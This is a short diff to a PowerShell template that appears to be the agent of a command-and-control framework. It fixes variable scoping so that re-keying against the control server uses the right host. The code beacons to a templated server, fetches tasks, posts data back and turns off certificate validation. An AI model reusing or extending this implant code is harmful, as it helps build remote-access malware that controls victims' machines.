@@ -1,5 +1,5 @@
-$server = "{{ host }}";
-$Script:ControlServers = @($server);
+$Script:server = "{{ host }}";
+$Script:ControlServers = @($Script:server);
 $Script:ServerIndex = 0;
 if($server.StartsWith('https')){
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
@@ -38,7 +38,7 @@ $Script:SendMessage = {
                 # exception posting data...
                 if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                     # restart key negotiation
-                    Start-Negotiate -S "$ser" -SK $SK -UA $ua;
+                    Start-Negotiate -S "$Script:server" -SK $SK -UA $ua;
                     }
                 }
             }
@@ -77,7 +77,7 @@ $Script:GetTask = {
         $script:MissedCheckins += 1;
         if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
             # restart key negotiation
-            Start-Negotiate -S "$ser" -SK $SK -UA $ua;
+            Start-Negotiate -S "$Script:server" -SK $SK -UA $ua;
         }
     }
 };
